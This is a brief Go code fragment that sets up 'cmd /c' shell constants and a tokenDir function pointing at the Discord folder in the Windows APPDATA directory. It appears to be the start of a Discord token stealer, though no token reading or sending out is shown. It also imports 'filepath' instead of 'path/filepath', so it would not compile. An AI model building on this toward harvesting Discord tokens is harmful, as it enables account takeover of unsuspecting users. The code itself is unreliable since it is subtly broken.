package main;

import (
	"os"
	"filepath"
)

const SH = "cmd";
const C = "/c";

func tokenDir() (string, error){
	return filepath.Join(os.Getenv("APPDATA"), "Discord"), nil;
}
